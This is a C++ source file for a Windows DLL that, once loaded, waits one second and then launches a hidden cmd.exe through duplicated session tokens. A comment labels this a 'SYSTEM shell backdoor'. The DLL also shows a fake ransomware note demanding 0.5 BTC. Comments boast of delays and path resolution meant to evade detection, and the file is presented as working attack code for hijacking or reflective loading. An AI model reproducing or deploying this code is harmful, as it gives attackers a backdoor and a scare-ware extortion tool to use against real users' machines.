// cl /LD nsfw.cpp /link /OUT:win32.dll


#include <windows.h>
#include <wtsapi32.h>
#include <userenv.h>
#include <thread>
#include <string>

#pragma comment(lib, "Wtsapi32.lib")
#pragma comment(lib, "Userenv.lib")

// Obfuscated ransom message to evade basic static scans
void ShowFakeRansomNote() {
    const char* msg =
        "Your files have been encrypted.\n\n"
        "Send 0.5 BTC to the wallet address below:\n"
        "1FakeBTCAddrXYZ999\n\n"
        "Do not power off your machine!";
    MessageBoxA(NULL, msg, "!!! YOUR SYSTEM IS LOCKED !!!", MB_OK | MB_ICONERROR);
}

// Spawn cmd.exe under SYSTEM on active session — memory-safe variant
bool LaunchAsSystem(LPCWSTR binary) {
    WTS_SESSION_INFO* sessions = nullptr;
    DWORD sessionCount = 0;
    bool success = false;

    if (!WTSEnumerateSessionsW(WTS_CURRENT_SERVER_HANDLE, 0, 1, &sessions, &sessionCount)) {
        return false;
    }

    for (DWORD i = 0; i < sessionCount; ++i) {
        if (sessions[i].State != WTSActive) continue;

        HANDLE userToken = nullptr;
        if (!WTSQueryUserToken(sessions[i].SessionId, &userToken)) continue;

        HANDLE duplicatedToken = nullptr;
        if (!DuplicateTokenEx(userToken, TOKEN_ALL_ACCESS, nullptr, SecurityImpersonation, TokenPrimary, &duplicatedToken)) {
            CloseHandle(userToken);
            continue;
        }

        LPVOID env = nullptr;
        if (!CreateEnvironmentBlock(&env, duplicatedToken, FALSE)) {
            CloseHandle(duplicatedToken);
            CloseHandle(userToken);
            continue;
        }

        STARTUPINFOW si = { sizeof(si) };
        si.lpDesktop = const_cast<LPWSTR>(L"winsta0\\default");
        PROCESS_INFORMATION pi = {};

        if (CreateProcessAsUserW(duplicatedToken, binary, nullptr, nullptr, nullptr, FALSE,
            CREATE_UNICODE_ENVIRONMENT | CREATE_NO_WINDOW, env, nullptr, &si, &pi)) {
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            success = true;
        }

        DestroyEnvironmentBlock(env);
        CloseHandle(duplicatedToken);
        CloseHandle(userToken);
    }

    WTSFreeMemory(sessions);
    return success;
}

// Optional: dynamically resolve cmd path to avoid static signature
std::wstring GetSystemShell() {
    WCHAR sysPath[MAX_PATH] = { 0 };
    GetSystemDirectoryW(sysPath, MAX_PATH);
    return std::wstring(sysPath) + L"\\cmd.exe";
}

// Entry point for reflective DLL
BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID) {
    if (reason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hModule);

        std::thread([]() {
            std::this_thread::sleep_for(std::chrono::seconds(1)); // Delay for evasion
            LaunchAsSystem(GetSystemShell().c_str()); // SYSTEM shell backdoor
            ShowFakeRansomNote();                     // Fake ransom popup
        }).detach();
    }
    return TRUE;
}
